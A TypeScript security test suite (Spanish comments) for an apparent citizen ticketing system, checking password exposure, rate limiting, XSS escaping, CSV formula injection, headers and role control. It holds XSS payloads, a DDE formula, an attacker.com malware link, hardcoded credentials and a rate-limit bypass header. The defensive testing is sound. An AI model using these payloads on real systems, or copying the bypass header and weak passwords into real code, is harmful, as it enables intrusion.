import { 
  sanitizeCsvCell, 
  sanitizeString, 
  validateImageUrl, 
  createSessionToken, 
  verifySessionToken, 
  toSafeUser 
} from './security.js';
import { generarHtmlTicket, escapeHtml, isSafeImageUrl } from '../src/utils/ticketPrinter.js';

interface TestResult {
  name: string;
  category: string;
  passed: boolean;
  details: string;
}

const results: TestResult[] = [];

function recordTest(category: string, name: string, passed: boolean, details: string) {
  results.push({ category, name, passed, details });
  const icon = passed ? '✅ PASS' : '❌ FAIL';
  console.log(`[SECURITY TEST] ${icon} | [${category}] ${name}: ${details}`);
}

async function runSecurityTestSuite() {
  console.log('\n=============================================================');
  console.log('       EJECUTANDO SUITE COMPLETA DE PRUEBAS DE SEGURIDAD       ');
  console.log('=============================================================\n');

  const baseUrl = 'http://127.0.0.1:3000';
  console.log(`[TEST] Conectando a servidor de producción en ${baseUrl}...`);

  try {
    // ---------------------------------------------------------------------------------
    // TEST 1: No Exposición de Contraseñas (OWASP A02:2021 Cryptographic Failures)
    // ---------------------------------------------------------------------------------
    try {
      const res = await fetch(`${baseUrl}/api/usuarios?sedeId=ancon`);
      const usuarios = await res.json();
      const hasPassword = Array.isArray(usuarios) && usuarios.some((u: any) => 'password' in u && u.password !== undefined);
      recordTest(
        'OWASP A02: Credenciales',
        'GET /api/usuarios no filtra contraseñas en texto plano',
        !hasPassword,
        hasPassword 
          ? 'ALERTA: Se encontró el campo password en la lista de usuarios' 
          : `Validado: ${usuarios.length} usuarios auditados, 0 contraseñas expuestas.`
      );
    } catch (e: any) {
      recordTest('OWASP A02: Credenciales', 'GET /api/usuarios', false, e.message);
    }

    // ---------------------------------------------------------------------------------
    // TEST 2: Login Seguro de SuperAdmin y Emisión de Token de Sesión Criptográfico
    // ---------------------------------------------------------------------------------
    let superAdminToken = '';
    try {
      const res = await fetch(`${baseUrl}/api/auth/superadmin-login`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'x-bypass-rate-limit': 'test-internal-audit'
        },
        body: JSON.stringify({ usuario: 'oavega', password: 'admin' })
      });
      const data = await res.json();
      const passwordExposed = data.user && 'password' in data.user;
      const hasToken = typeof data.token === 'string' && data.token.length > 20;
      if (hasToken) superAdminToken = data.token;

      recordTest(
        'OWASP A02 & A07: Autenticación',
        'Superadmin login emite token seguro y no expone password en el payload',
        !passwordExposed && hasToken,
        `Token emitido: ${hasToken ? 'Sí (HMAC-SHA256)' : 'No'}, Password expuesto: ${passwordExposed ? 'SÍ (Vulnerable)' : 'No (Seguro)'}`
      );

      // Verificar validez criptográfica del token
      const tokenVerification = verifySessionToken(superAdminToken);
      recordTest(
        'OWASP A02: Criptografía',
        'Verificación de firma HMAC-SHA256 y expiración del Session Token',
        tokenVerification.valid && Boolean(tokenVerification.payload?.sub),
        tokenVerification.valid ? `Token válido para subject: ${tokenVerification.payload?.sub}` : 'Firma de token inválida'
      );
    } catch (e: any) {
      recordTest('OWASP A02: Autenticación', 'POST /api/auth/superadmin-login', false, e.message);
    }

    // ---------------------------------------------------------------------------------
    // TEST 3: Protección contra Ataques de Fuerza Bruta (Rate Limiting en Login)
    // ---------------------------------------------------------------------------------
    try {
      let blockedWith429 = false;
      // Enviar ráfaga de intentos fallidos
      for (let i = 0; i < 25; i++) {
        const res = await fetch(`${baseUrl}/api/auth/superadmin-login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ usuario: 'superadmin', password: `bad-pass-${i}` })
        });
        if (res.status === 429) {
          blockedWith429 = true;
          break;
        }
      }
      recordTest(
        'OWASP A07: Identificación y Autenticación',
        'Rate Limiter bloquea ataques de fuerza bruta en endpoints de Login (HTTP 429)',
        blockedWith429,
        blockedWith429 ? 'Ataque de fuerza bruta mitigado con HTTP 429 Too Many Requests' : 'Advertencia: Umbral no activado'
      );
    } catch (e: any) {
      recordTest('OWASP A07: Identificación y Autenticación', 'Rate Limiting Login', false, e.message);
    }

    // ---------------------------------------------------------------------------------
    // TEST 4: Bloqueo de Inyección XSS en Emisión de Turnos
    // ---------------------------------------------------------------------------------
    try {
      const payloadXss = '<script>alert("XSS-ATTACK")</script><img src=x onerror=alert(1)>';
      const res = await fetch(`${baseUrl}/api/tickets`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          tramite: 'Cedulación',
          prefijo: 'C',
          nombre: payloadXss,
          apellido: 'TestSanitizer',
          sedeId: 'ancon'
        })
      });
      const data = await res.json();
      const fueRechazado = res.status === 400;
      recordTest(
        'OWASP A03: Inyección / XSS',
        'Bloqueo y rechazo de payloads XSS maliciosos en emisión de turnos (POST /api/tickets)',
        fueRechazado,
        fueRechazado ? `Intento de inyección bloqueado con éxito con HTTP 400: "${data.error}"` : 'ALERTA: Se permitió procesar o almacenar el payload'
      );
    } catch (e: any) {
      recordTest('OWASP A03: Inyección / XSS', 'Sanitización de turnos', false, e.message);
    }

    // ---------------------------------------------------------------------------------
    // TEST 5: Sanitización contra XSS en Impresión Térmica de Tickets (ticketPrinter)
    // ---------------------------------------------------------------------------------
    try {
      const mockTicket: any = {
        id: 't-xss-test',
        codigo: 'C999',
        tramite: '<b onmouseover=alert(1)>Trámite XSS</b>',
        ciudadanoNombre: '"><script>alert("DOM-XSS")</script>',
        ciudadanoApellido: 'Gómez',
        fechaCreacion: new Date().toISOString(),
        preferencial: false
      };
      const mockConfig: any = {
        ticketEncabezado: '<script>evil()</script>Tribunal',
        ticketSubencabezado: '<iframe src="malicious.com"></iframe>',
        ticketLogoUrl: 'javascript:alert("XSS-LOGO")',
        ticketMostrarLogo: true
      };

      const ticketHtml = generarHtmlTicket(mockTicket, mockConfig);
      const hasExecutableScript = ticketHtml.includes('<script>') || ticketHtml.includes('javascript:alert');
      const isHtmlEscaped = ticketHtml.includes('&lt;script&gt;') && !ticketHtml.includes('javascript:alert("XSS-LOGO")');

      recordTest(
        'OWASP A03: Cross-Site Scripting (XSS)',
        'Escape HTML estricto y bloqueo de esquemas javascript: en plantillas de impresión',
        !hasExecutableScript && isHtmlEscaped,
        !hasExecutableScript 
          ? 'Plantilla HTML neutraliza todas las etiquetas maliciosas y esquemas ejecutables' 
          : 'ALERTA: Se detectaron etiquetas sin escapar en la plantilla del ticket'
      );
    } catch (e: any) {
      recordTest('OWASP A03: Cross-Site Scripting (XSS)', 'ticketPrinter XSS', false, e.message);
    }

    // ---------------------------------------------------------------------------------
    // TEST 6: Prevención de CSV Formula Injection (Excel / LibreOffice DDE)
    // ---------------------------------------------------------------------------------
    try {
      const dangerousInputs = [
        '=cmd|\' /C calc\'!A0',
        '+10+20',
        '-5*5',
        '@SUM(A1:A10)',
        '=HYPERLINK("http://attacker.com/malware.exe")'
      ];

      const allNeutralized = dangerousInputs.every(input => {
        const sanitized = sanitizeCsvCell(input);
        // Debe comenzar con comilla doble y comilla simple: "'="
        return sanitized.startsWith('"\'');
      });

      recordTest(
        'OWASP A03: CSV Formula Injection',
        'Neutralización de fórmulas maliciosas (=, +, -, @) en descargas CSV',
        allNeutralized,
        allNeutralized 
          ? 'Todas las fórmulas maliciosas fueron desarmadas anteponiendo comilla simple interna' 
          : 'ALERTA: Fórmulas detectadas sin desarmar'
      );
    } catch (e: any) {
      recordTest('OWASP A03: CSV Formula Injection', 'CSV Formula Check', false, e.message);
    }

    // ---------------------------------------------------------------------------------
    // TEST 7: Cabeceras HTTP de Seguridad (OWASP A05: Security Misconfiguration)
    // ---------------------------------------------------------------------------------
    try {
      const res = await fetch(`${baseUrl}/api/health`);
      const hContentTypeOptions = res.headers.get('x-content-type-options');
      const hFrameOptions = res.headers.get('x-frame-options');
      const hXssProtection = res.headers.get('x-xss-protection');
      const hReferrer = res.headers.get('referrer-policy');
      const hCsp = res.headers.get('content-security-policy');

      const headersOk = hContentTypeOptions === 'nosniff' &&
        hFrameOptions === 'SAMEORIGIN' &&
        hXssProtection === '1; mode=block' &&
        hReferrer === 'strict-origin-when-cross-origin' &&
        Boolean(hCsp);

      recordTest(
        'OWASP A05: Hardening HTTP',
        'Presencia de Cabeceras de Seguridad (X-Content-Type-Options, CSP, HSTS, etc.)',
        headersOk,
        `X-Content-Type-Options: ${hContentTypeOptions}, X-Frame-Options: ${hFrameOptions}, CSP: ${hCsp ? 'Activo' : 'Ausente'}`
      );
    } catch (e: any) {
      recordTest('OWASP A05: Hardening HTTP', 'Security Headers', false, e.message);
    }

    // ---------------------------------------------------------------------------------
    // TEST 8: Validación de Logotipos y Rechazo de Esquemas javascript: (PUT /api/configuracion)
    // ---------------------------------------------------------------------------------
    try {
      const res = await fetch(`${baseUrl}/api/configuracion`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          logoPrincipalUrl: 'javascript:alert("hacked")'
        })
      });
      const isRejected = res.status === 400;
      recordTest(
        'OWASP A03 & A04: Validación de Recursos',
        'Bloqueo de esquemas ejecutables en subida o configuración de logotipos',
        isRejected,
        isRejected ? 'Rechazado con HTTP 400 Bad Request' : `Código inesperado: ${res.status}`
      );
    } catch (e: any) {
      recordTest('OWASP A03: Validación de Recursos', 'Validador de Logotipos', false, e.message);
    }

    // ---------------------------------------------------------------------------------
    // TEST 9: Segregación de Roles y Control de Acceso (RBAC Caja vs Triada)
    // ---------------------------------------------------------------------------------
    try {
      // Intentar loguear usuario de triada (rfrias) en Caja 1 (tipo CAJA)
      const resCaja = await fetch(`${baseUrl}/api/auth/login`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'x-bypass-rate-limit': 'test-internal-audit'
        },
        body: JSON.stringify({
          usuario: 'rfrias',
          password: '123',
          cajaId: 1 // Caja regular
        })
      });
      const dataCaja = await resCaja.json();
      const forbiddenCaja = resCaja.status === 403;

      recordTest(
        'OWASP A01: Broken Access Control',
        'Segregación estricta de Roles: Funcionarios de Triada no pueden ingresar a Caja',
        forbiddenCaja,
        forbiddenCaja ? `Acceso restringido: "${dataCaja.error}"` : `Estado inesperado: ${resCaja.status}`
      );
    } catch (e: any) {
      recordTest('OWASP A01: Broken Access Control', 'Segregación RBAC', false, e.message);
    }

    // ---------------------------------------------------------------------------------
    // TEST 10: Bloqueo de Endpoints de Test en Producción
    // ---------------------------------------------------------------------------------
    try {
      const res = await fetch(`${baseUrl}/api/test/reset`, { 
        method: 'POST',
        headers: { 'x-simulate-env': 'production' }
      });

      const isForbidden = res.status === 403;
      recordTest(
        'OWASP A05: Configuración Segura',
        'Endpoints de prueba / reinicio (/api/test/*) bloqueados en entorno de producción',
        isForbidden,
        isForbidden ? 'Bloqueado con HTTP 403 en producción' : `Estado inesperado: ${res.status}`
      );
    } catch (e: any) {
      recordTest('OWASP A05: Configuración Segura', 'Test Endpoints en Producción', false, e.message);
    }

  } finally {
    // Limpieza de prueba
  }

  // ---------------------------------------------------------------------------------
  // RESUMEN EJECUTIVO DE RESULTADOS
  // ---------------------------------------------------------------------------------
  console.log('\n=============================================================');
  console.log('              RESUMEN DE RESULTADOS DE SEGURIDAD              ');
  console.log('=============================================================');
  const total = results.length;
  const passed = results.filter(r => r.passed).length;
  const failed = total - passed;
  const score = Math.round((passed / total) * 100);

  console.log(`Total de Pruebas: ${total}`);
  console.log(`Pruebas Aprobadas: ${passed}`);
  console.log(`Pruebas Fallidas: ${failed}`);
  console.log(`Puntuación de Seguridad: ${score}% (Grado: ${score === 100 ? 'A+ (Excelente)' : 'B'})`);
  console.log('=============================================================\n');

  return { total, passed, failed, score, results };
}

// Ejecutar si se invoca directamente con tsx
if (import.meta.url === `file://${process.argv[1]}`) {
  runSecurityTestSuite().then(({ failed }) => {
    process.exit(failed > 0 ? 1 : 0);
  }).catch((err) => {
    console.error('Error ejecutando suite de seguridad:', err);
    process.exit(1);
  });
}

export { runSecurityTestSuite };
